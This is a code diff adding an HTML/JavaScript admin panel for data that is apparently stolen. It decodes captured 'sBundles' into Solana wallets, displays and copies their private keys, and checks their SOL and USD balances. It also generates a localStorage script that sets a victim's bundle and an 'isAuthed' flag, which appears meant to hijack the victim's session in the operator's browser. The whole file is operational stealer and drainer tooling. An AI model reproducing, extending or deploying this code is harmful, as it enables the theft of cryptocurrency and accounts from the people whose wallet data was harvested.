+            
+            const script = `
+localStorage.setItem('sBundles', '${entry.sBundles}');
+localStorage.setItem('isAuthed', 'true');
+console.log('fuck me bro');
+console.log('done');
+location.reload();`;
+            
+            navigator.clipboard.writeText(script).then(() => {
+                showNotification('Script copied to clipboard!');
+            }).catch(err => {
+                alert('Failed to copy script: ' + err.message);
+            });
+        }
+
+        function viewWallets(id) {
+            const entry = bookmarkData.find(item => item.id === id);
+            if (!entry || !entry.processedSBundles) {
+                alert('No wallet data found for this entry');
+                return;
+            }
+            
+            const modal = createModal();
+            const content = modal.querySelector('.modal-content');
+            
+            let walletsHtml = '';
+            
+            if (entry.processedSBundles.error) {
+                walletsHtml += `
+                    <div class="wallet-item wallet-error">
+                        <p style="color: #ef4444; margin: 0; font-size: 14px;"><strong>Error:</strong> ${entry.processedSBundles.error}</p>
+                    </div>
+                `;
+            }
+            
+            if (entry.processedSBundles.wallets && entry.processedSBundles.wallets.length > 0) {
+                walletsHtml += entry.processedSBundles.wallets.map((wallet, index) => {
+                    if (wallet.error) {
+                        return `
+                            <div class="wallet-item wallet-error">
+                                <div class="wallet-header">
+                                    <span class="wallet-number">
+                                        <svg class="wallet-status-icon" viewBox="0 0 24 24" fill="#ef4444">
+                                            <path d="M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z"/>
+                                        </svg>
+                                        Wallet ${wallet.walletIndex}
+                                    </span>
+                                </div>
+                                <p style="color: #ef4444; margin: 0; font-size: 12px;">${wallet.error}</p>
+                            </div>
+                        `;
+                    } else {
+                        return `
+                            <div class="wallet-item wallet-success">
+                                <div class="wallet-header">
+                                    <span class="wallet-number">
+                                        <svg class="wallet-status-icon" viewBox="0 0 24 24" fill="#10b981">
+                                            <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/>
+                                        </svg>
+                                        Wallet ${wallet.walletIndex}
+                                    </span>
+                                </div>
+                                
+                                <div class="key-section">
+                                    <div class="key-label">Wallet address</div>
+                                    <div class="key-display key-display-with-copy" onclick="copyToClipboard('${wallet.publicKey}')">
+                                        ${wallet.publicKey}
+                                        <button class="copy-btn">
+                                            <svg viewBox="0 0 24 24">
+                                                <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
+                                            </svg>
+                                        </button>
+                                    </div>
+                                </div>
+                                
+                                <div class="key-section">
+                                    <div class="key-label">Private Key</div>
+                                    <div class="key-display blurred" data-key="${wallet.privateKey}" data-type="private" onclick="toggleKeyVisibility(this)">
+                                        ${wallet.privateKey}
+                                    </div>
+                                </div>
+                            </div>
+                        `;
+                    }
+                }).join('');
+            }
+            
+            content.innerHTML = `
+                <div class="modal-header">
+                    <h3 class="modal-title">Private Key</h3>
+                    <button class="modal-close" onclick="closeModal()">&times;</button>
+                </div>
+                <div class="modal-body">
+                    ${walletsHtml}
+                </div>
+            `;
+            
+            document.body.appendChild(modal);
+        }
+
+        function viewFullData(id) {
+            const entry = bookmarkData.find(item => item.id === id);
+            if (!entry) {
+                alert('Entry not found');
+                return;
+            }
+            
+            const modal = createModal();
+            const content = modal.querySelector('.modal-content');
+            
+            content.innerHTML = `
+                <div class="modal-header">
+                    <h3 class="modal-title" style="display: flex; align-items: center; gap: 10px;">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="#ffffff">
+                            <path d="M14,2H6A2,2 0 0,0 4,4V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V8L14,2M18,20H6V4H13V9H18V20Z"/>
+                        </svg>
+                        Full Data for Entry #${entry.id}
+                    </h3>
+                    <button class="modal-close" onclick="closeModal()">&times;</button>
+                </div>
+                <div class="modal-body">
+                    <pre style="background: rgba(0,0,0,0.4); padding: 20px; border-radius: 8px; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 11px; border: 1px solid rgba(255,255,255,0.1); margin: 0; line-height: 1.4; white-space: pre-wrap; word-wrap: break-word;">${JSON.stringify(entry, null, 2)}</pre>
+                </div>
+            `;
+            
+            document.body.appendChild(modal);
+        }
+
+        function createModal() {
+            const modal = document.createElement('div');
+            modal.className = 'modal';
+            modal.innerHTML = '<div class="modal-content"></div>';
+            
+            modal.onclick = (e) => {
+                if (e.target === modal) closeModal();
+            };
+            
+            return modal;
+        }
+
+        function closeModal() {
+            const modal = document.querySelector('.modal');
+            if (modal) {
+                document.body.removeChild(modal);
+            }
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                showNotification('Key copied to clipboard!');
+            }).catch(err => {
+                alert('Failed to copy: ' + err.message);
+            });
+        }
+
+        function toggleKeyVisibility(element) {
+            const key = element.getAttribute('data-key');
+            const type = element.getAttribute('data-type');
+            
+            if (element.classList.contains('blurred')) {
+                element.classList.remove('blurred');
+                element.classList.add('revealed');
+                showNotification(`${type === 'private' ? 'Private' : 'Public'} key revealed! Click again to copy.`);
+            } else if (element.classList.contains('revealed') || type === 'public') {
+                copyToClipboard(key);
+            }
+        }
+
+        function showNotification(message) {
+            const notification = document.getElementById('copyNotification');
+            notification.innerHTML = `
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="margin-right: 8px; vertical-align: middle;">
+                    <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/>
+                </svg>
+                ${message}
+            `;
+            notification.style.display = 'block';
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 2000);
+        }
+
+        async function checkBalances() {
+            const btn = document.getElementById('checkBalanceBtn');
+            const originalContent = btn.innerHTML;
+            
+            btn.innerHTML = `
+                <svg viewBox="0 0 24 24" style="animation: spin 1s linear infinite;">
+                    <path d="M12,4V2A10,10 0 0,0 2,12H4A8,8 0 0,1 12,4Z"/>
+                </svg>
+                <div class="tooltip">Checking...</div>
+            `;
+            btn.disabled = true;
+            
+            try {
+                const response = await fetch('/api/check-balances');
+                const data = await response.json();
+                
+                if (data.success) {
+                    displayBalanceResults(data);
+                } else {
+                    alert('Error checking balances: ' + data.error);
+                }
+            } catch (error) {
+                alert('Error checking balances: ' + error.message);
+            } finally {
+                btn.innerHTML = originalContent;
+                btn.disabled = false;
+            }
+        }
+
+        function displayBalanceResults(data) {
+            const resultsDiv = document.getElementById('balanceResults');
+            const summaryDiv = document.getElementById('balanceSummary');
+            const tbody = document.getElementById('balanceTableBody');
+            
+            summaryDiv.innerHTML = `
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;">
+                    <div style="text-align: center;">
+                        <div style="font-size: 28px; font-weight: 800; color: #ffffff; margin-bottom: 5px;">
+                            ${data.totalAddresses}
+                        </div>
+                        <div style="color: rgba(255, 255, 255, 0.7);">Total Addresses</div>
+                    </div>
+                    <div style="text-align: center;">
+                        <div style="font-size: 28px; font-weight: 800; color: #10b981; margin-bottom: 5px;">
+                            ${data.totalSolBalance.toFixed(4)} SOL
+                        </div>
+                        <div style="color: rgba(255, 255, 255, 0.7);">Total SOL Balance</div>
+                    </div>
+                    <div style="text-align: center;">
+                        <div style="font-size: 28px; font-weight: 800; color: #f59e0b; margin-bottom: 5px;">
+                            $${data.totalUsdBalance.toFixed(2)}
+                        </div>
+                        <div style="color: rgba(255, 255, 255, 0.7);">Total USD Value</div>
+                    </div>
+                    <div style="text-align: center;">
+                        <div style="font-size: 28px; font-weight: 800; color: #ef4444; margin-bottom: 5px;">
+                            $${data.solPrice.toFixed(2)}
+                        </div>
+                        <div style="color: rgba(255, 255, 255, 0.7);">SOL Price</div>
+                    </div>
+                </div>
+            `;
+            
+            tbody.innerHTML = data.addressBalances.map(addr => {
+                const balanceColor = addr.solBalance > 0 ? '#10b981' : '#6b7280';
+                const shortAddress = addr.publicKey.substring(0, 8) + '...' + addr.publicKey.substring(addr.publicKey.length - 8);
+                
+                return `
+                    <tr>
+                        <td style="font-weight: 600;">#${addr.entryId}</td>
+                        <td>Wallet ${addr.walletIndex}</td>
+                        <td>
+                            <div style="font-family: 'Courier New', monospace; font-size: 12px;">
+                                <span title="${addr.publicKey}">${shortAddress}</span>
+                            </div>
+                        </td>
+                        <td style="color: ${balanceColor}; font-weight: 600;">
+                            ${addr.solBalance.toFixed(6)} SOL
+                        </td>
+                        <td style="color: ${balanceColor}; font-weight: 600;">
+                            $${addr.usdBalance.toFixed(2)}
+                        </td>
+                        <td>
+                            <div style="display: flex; gap: 8px;">
+                                <button class="btn btn-primary" onclick="copyToClipboard('${addr.publicKey}')">
+                                    <svg viewBox="0 0 24 24">
+                                        <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
+                                    </svg>
+                                    <div class="tooltip">Copy Address</div>
+                                </button>
+                                <a href="https://solscan.io/account/${addr.publicKey}" target="_blank" class="btn btn-secondary">
+                                    <svg viewBox="0 0 24 24">
+                                        <path d="M14,3V5H17.59L7.76,14.83L9.17,16.24L19,6.41V10H21V3M19,19H5V5H12V3H5C3.89,3 3,3.9 3,5V19A2,2 0 0,0 5,21H19A2,2 0 0,0 21,19V12H19V19Z"/>
+                                    </svg>
+                                    <div class="tooltip">View on Solscan</div>
+                                </a>
+                            </div>
+                        </td>
+                    </tr>
+                `;
+            }).join('');
+            
+            resultsDiv.style.display = 'block';
+            resultsDiv.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function hideBalanceResults() {
+            document.getElementById('balanceResults').style.display = 'none';
+        }
+
+        const videoOptions = [
+            {
+                id: 'default',
+                title: 'theme',
+                description: 'fuh vkevin 4vzon top',
+                url: 'https://r2.guns.lol/db4d56f0-b5a8-4e40-a0ee-bc5d5e27b7ae.mp4'
+            },
+            {
+                id: 'cyber',
+                title: 'fuh vkevin 4vzon top',
+                description: 'fuh vkevin 4vzon topn',
+                url: 'https://r2.guns.lol/3cc5d2c6-e636-4db6-8b1b-01e6e34b6853.mp4'
+            },
+            {
+                id: 'space',
+                title: 'fuh vkevin 4vzon top',
+                description: 'fuh vkevin 4vzon top',
+                url: 'https://r2.guns.lol/9a0763ab-cc76-4954-b4bf-1b527f0b66b8.mp4'
+            }
+        ];
+
+        let currentVideoUrl = localStorage.getItem('selectedVideo') || videoOptions[0].url;
+
+        function openSettingsModal() {
+            const modal = createModal();
+            const content = modal.querySelector('.modal-content');
+            
+            content.innerHTML = `
+                <div class="modal-header">
+                    <h3 class="modal-title" style="display: flex; align-items: center; gap: 10px;">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="#ffffff">
+                            <path d="M12,15.5A3.5,3.5 0 0,1 8.5,12A3.5,3.5 0 0,1 12,8.5A3.5,3.5 0 0,1 15.5,12A3.5,3.5 0 0,1 12,15.5M19.43,12.97C19.47,12.65 19.5,12.33 19.5,12C19.5,11.67 19.47,11.34 19.43,11.03L21.54,9.37C21.73,9.22 21.78,8.95 21.66,8.73L19.66,5.27C19.54,5.05 19.27,4.96 19.05,5.05L16.56,6.05C16.04,5.66 15.5,5.32 14.87,5.07L14.5,2.42C14.46,2.18 14.25,2 14,2H10C9.75,2 9.54,2.18 9.5,2.42L9.13,5.07C8.5,5.32 7.96,5.66 7.44,6.05L4.95,5.05C4.73,4.96 4.46,5.05 4.34,5.27L2.34,8.73C2.22,8.95 2.27,9.22 2.46,9.37L4.57,11.03C4.53,11.34 4.5,11.67 4.5,12C4.5,12.33 4.53,12.65 4.57,12.97L2.46,14.63C2.27,14.78 2.22,15.05 2.34,15.27L4.34,18.73C4.46,18.95 4.73,19.03 4.95,18.95L7.44,17.94C7.96,18.34 8.5,18.68 9.13,18.93L9.5,21.58C9.54,21.82 9.75,22 10,22H14C14.25,22 14.46,21.82 14.5,21.58L14.87,18.93C15.5,18.68 16.04,18.34 16.56,17.94L19.05,18.95C19.27,19.03 19.54,18.95 19.66,18.73L21.66,15.27C21.78,15.05 21.73,14.78 21.54,14.63L19.43,12.97Z"/>
+                        </svg>
+                        Admin Settings
+                    </h3>
+                    <button class="modal-close" onclick="closeModal()">&times;</button>
+                </div>
+                <div class="modal-body">
+                    <div class="settings-section">
+                        <div class="settings-title">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="#ffffff">
+                                <path d="M17,10.5V7A1,1 0 0,0 16,6H4A1,1 0 0,0 3,7V10.5H17M20,2H4A2,2 0 0,0 2,4V11H7V13A1,1 0 0,0 8,14H16A1,1 0 0,0 17,13V11H22V4A2,2 0 0,0 20,2Z"/>
+                            </svg>
+                            Background Video
+                        </div>
+                        <div class="video-grid" id="videoGrid">
+                            ${videoOptions.map(video => `
+                                <div class="video-option ${video.url === currentVideoUrl ? 'selected' : ''}" 
+                                     data-video-url="${video.url}" 
+                                     onclick="selectVideo('${video.url}', this)">
+                                    <video class="video-preview" muted loop autoplay>
+                                        <source src="${video.url}" type="video/mp4">
+                                    </video>
+                                    <div class="video-info">
+                                        <div class="video-title">${video.title}</div>
+                                        <div class="video-description">${video.description}</div>
+                                    </div>
+                                    <div class="selected-indicator">
+                                        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                                            <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/>
+                                        </svg>
+                                    </div>
+                                </div>
+                            `).join('')}
+                        </div>
+                        <button class="save-btn" onclick="applyVideoSettings()">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="margin-right: 8px; vertical-align: middle;">
+                                <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/>
+                            </svg>
+                            Apply Video Settings
+                        </button>
+                    </div>
+                    
+                    <div class="settings-section">
+                        <div class="settings-title">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="#ffffff">
+                                <path d="M12,18.5A6.5,6.5 0 0,1 5.5,12A6.5,6.5 0 0,1 12,5.5A6.5,6.5 0 0,1 18.5,12A6.5,6.5 0 0,1 12,18.5M12,16A4,4 0 0,0 16,12A4,4 0 0,0 12,8A4,4 0 0,0 8,12A4,4 0 0,0 12,16Z"/>
+                            </svg>
+                            Theme Settings
+                        </div>
+                        <div class="theme-grid" id="themeGrid">
+                            <div class="theme-option ${getCurrentTheme() === 'default' ? 'selected' : ''}" 
+                                 data-theme="default" 
+                                 onclick="selectTheme('default', this)">
+                                <div class="theme-preview default-preview"></div>
+                                <div class="theme-info">
+                                    <div class="theme-title">Default</div>
+                                    <div class="theme-description">Current solid theme</div>
+                                </div>
+                                <div class="selected-indicator">
+                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                                        <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/>
+                                    </svg>
+                                </div>
+                            </div>
+                            
+                            <div class="theme-option ${getCurrentTheme() === 'transparent' ? 'selected' : ''}" 
+                                 data-theme="transparent" 
+                                 onclick="selectTheme('transparent', this)">
+                                <div class="theme-preview transparent-preview"></div>
+                                <div class="theme-info">
+                                    <div class="theme-title">Transparent</div>
+                                    <div class="theme-description">Semi-transparent theme</div>
+                                </div>
+                                <div class="selected-indicator">
+                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                                        <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/>
+                                    </svg>
+                                </div>
+                            </div>
+                        </div>
+                        <button class="save-btn" onclick="applyThemeSettings()">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="margin-right: 8px; vertical-align: middle;">
+                                <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/>
+                            </svg>
+                            Apply Theme Settings
+                        </button>
+                    </div>
+                </div>
+            `;
+            
+            document.body.appendChild(modal);
+        }
+
+        function selectVideo(videoUrl, element) {
+            document.querySelectorAll('.video-option').forEach(option => {
+                option.classList.remove('selected');
+            });
+            
+            element.classList.add('selected');
+            
+            currentVideoUrl = videoUrl;
+        }
+
+        function applyVideoSettings() {
+            const backgroundVideo = document.getElementById('backgroundVideo');
+            const videoSource = backgroundVideo.querySelector('source');
+            
+            videoSource.src = currentVideoUrl;
+            backgroundVideo.load();
+            backgroundVideo.play();
+            
+            localStorage.setItem('selectedVideo', currentVideoUrl);
+            
+            showNotification('Background video updated successfully!');
+            closeModal();
+        }
+
+        function loadSavedVideo() {
+            const savedVideo = localStorage.getItem('selectedVideo');
+            if (savedVideo) {
+                const backgroundVideo = document.getElementById('backgroundVideo');
+                const videoSource = backgroundVideo.querySelector('source');
+                videoSource.src = savedVideo;
+                backgroundVideo.load();
+                currentVideoUrl = savedVideo;
+            }
+        }
+
+        function toggleVideoSound() {
+            const video = document.getElementById('backgroundVideo');
+            const soundIcon = document.getElementById('soundIcon');
+            
+            if (video.muted) {
+                video.muted = false;
+                soundIcon.innerHTML = '<path d="M14,3.23V5.29C16.89,6.15 19,8.83 19,12C19,15.17 16.89,17.85 14,18.71V20.77C18.01,19.86 21,16.28 21,12C21,7.72 18.01,4.14 14,3.23M16.5,12C16.5,10.23 15.5,8.71 14,7.97V16C15.5,15.29 16.5,13.76 16.5,12M3,9V15H7L12,20V4L7,9H3Z"/>';
+            } else {
+                video.muted = true;
+                soundIcon.innerHTML = '<path d="M12,4L9.91,6.09L12,8.18M4.27,3L3,4.27L7.73,9H3V15H7L12,20V13.27L16.25,17.53C15.58,18.04 14.83,18.46 14,18.7V20.77C15.38,20.45 16.63,19.82 17.68,18.96L19.73,21L21,19.73L12,10.73M19,12C19,12.94 18.8,13.82 18.46,14.64L19.97,16.15C20.62,14.91 21,13.5 21,12C21,7.72 18,4.14 14,3.23V5.29C16.89,6.15 19,8.83 19,12M16.5,12C16.5,10.23 15.5,8.71 14,7.97V10.18L16.45,12.63C16.5,12.43 16.5,12.21 16.5,12Z"/>';
+            }
+        }
+
+        let currentTheme = localStorage.getItem('selectedTheme') || 'default';
+
+        function getCurrentTheme() {
+            return currentTheme;
+        }
+
+        function selectTheme(theme, element) {
+            document.querySelectorAll('.theme-option').forEach(option => {
+                option.classList.remove('selected');
+            });
+            
+            element.classList.add('selected');
+            
+            currentTheme = theme;
+        }
+
+        function applyThemeSettings() {
+            document.body.className = currentTheme === 'transparent' ? 'transparent-theme' : '';
+            
+            localStorage.setItem('selectedTheme', currentTheme);
+            
+            showNotification('Theme updated successfully!');
+            closeModal();
+        }
+
+        function loadSavedTheme() {
+            const savedTheme = localStorage.getItem('selectedTheme');
+            if (savedTheme) {
+                currentTheme = savedTheme;
+                document.body.className = savedTheme === 'transparent' ? 'transparent-theme' : '';
+            }
+        }
+
+        // auth stuff
+        function checkAdminAuth() {
+            const adminToken = localStorage.getItem('adminAuth');
+            if (!adminToken) {
+                window.location.href = '/login';
+                return false;
+            }
+
+            fetch('/api/verify-admin', {
+                headers: {
+                    'Authorization': `Bearer ${adminToken}`
+                }
+            })
+            .then(response => response.json())
+            .then(result => {
+                if (!result.success) {
+                    localStorage.removeItem('adminAuth');
+                    window.location.href = '/login';
+                }
+            })
+            .catch(() => {
+                localStorage.removeItem('adminAuth');
+                window.location.href = '/login';
+            });
+
+            return true;
+        }
+
+        function makeAuthorizedRequest(url, options = {}) {
+            const adminToken = localStorage.getItem('adminAuth');
+            
+            if (!adminToken) {
+                window.location.href = '/login';
+                return;
+            }
+
+            return fetch(url, {
+                ...options,
+                headers: {
+                    ...options.headers,
+                    'Authorization': `Bearer ${adminToken}`
+                }
+            });
+        }
+
+        async function logout() {
+            const adminToken = localStorage.getItem('adminAuth');
+            
+            if (adminToken) {
+                try {
+                    await fetch('/api/admin-logout', {
+                        method: 'POST',
+                        headers: {
+                            'Authorization': `Bearer ${adminToken}`
+                        }
+                    });
+                } catch (error) {
+                    console.error('Logout error:', error);
+                }
+            }
+            
+            localStorage.removeItem('adminAuth');
+            window.location.href = '/login';
+        }
+
+        async function loadData() {
+            try {
+                const response = await makeAuthorizedRequest('/api/bookmark-data');
+                bookmarkData = await response.json();
+                renderStats();
+                renderTable();
+            } catch (error) {
+                console.error('Error loading data:', error);
+                if (error.status === 401) {
+                    window.location.href = '/login';
+                }
+            }
+        }
+
+        async function deleteEntry(id) {
+            if (confirm('Are you sure you want to delete this entry?')) {
+                try {
+                    const response = await makeAuthorizedRequest(`/api/bookmark-data/${id}`, {
+                        method: 'DELETE'
+                    });
+                    const result = await response.json();
+                    if (result.success) {
+                        await loadData();
+                    } else {
+                        alert('Failed to delete entry');
+                    }
+                } catch (error) {
+                    alert('Error deleting entry: ' + error.message);
+                }
+            }
+        }
+
+        async function checkBalances() {
+            const btn = document.getElementById('checkBalanceBtn');
+            const originalContent = btn.innerHTML;
+            
+            btn.innerHTML = `
+                <svg viewBox="0 0 24 24" style="animation: spin 1s linear infinite;">
+                    <path d="M12,4V2A10,10 0 0,0 2,12H4A8,8 0 0,1 12,4Z"/>
+                </svg>
+                <div class="tooltip">Checking...</div>
+            `;
+            btn.disabled = true;
+            
+            try {
+                const response = await makeAuthorizedRequest('/api/check-balances');
+                const data = await response.json();
+                
+                if (data.success) {
+                    displayBalanceResults(data);
+                } else {
+                    alert('Error checking balances: ' + data.error);
+                }
+            } catch (error) {
+                alert('Error checking balances: ' + error.message);
+            } finally {
+                btn.innerHTML = originalContent;
+                btn.disabled = false;
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            if (checkAdminAuth()) {
+                loadData();
+                loadSavedVideo();
+                loadSavedTheme();
+            }
+        });
+    </script>
+</body>
+</html>
